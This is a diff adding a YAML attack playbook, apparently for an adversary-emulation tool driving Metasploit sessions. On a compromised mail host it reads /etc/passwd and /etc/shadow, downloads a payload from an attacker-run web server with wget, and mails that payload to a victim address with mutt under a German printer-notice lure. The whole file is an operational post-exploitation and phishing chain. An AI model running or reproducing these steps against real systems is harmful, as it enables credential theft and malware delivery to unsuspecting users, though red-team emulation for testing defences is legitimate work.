@@ -1,0 +1,45 @@
+
+commands:
+  - type: msf-session
+    session: $MAIL_SESSION
+    cmd: id
+
+  - type: msf-session
+    session: $MAIL_SESSION
+    cmd: cat /etc/passwd
+
+  - type: msf-session
+    session: $MAIL_SESSION
+    cmd: cat /etc/shadow
+
+  - type: msf-session
+    session: $MAIL_SESSION
+    cmd: hostname
+
+  # serve payload via http
+  - type: webserv
+    local_path: playbooks/$ATTACHMENT
+    port: 8080
+    background: True
+
+  - type: msf-session
+    session: $MAIL_SESSION
+    cmd: wget -O /tmp/$ATTACHMENT $ATTACKER:8080
+
+  - type: msf-session
+    session: $MAIL_SESSION
+    cmd: command -v mutt
+
+  - type: shell
+    cmd: cat playbooks/muttrc | base64 -w0
+
+  - type: msf-session
+    session: $MAIL_SESSION
+    cmd: echo $RESULT_STDOUT | base64 -d > /tmp/.muttrc
+
+  - type: shell
+    cmd: cat playbooks/mailtext | base64 -w0
+
+  - type: msf-session
+    session: $MAIL_SESSION
+    cmd: echo $RESULT_STDOUT | base64 -d | mutt -a /tmp/$ATTACHMENT -s "Hinweise zum neuen Drucker" -F /tmp/.muttrc -- $VICTIM_USER_EMAIL
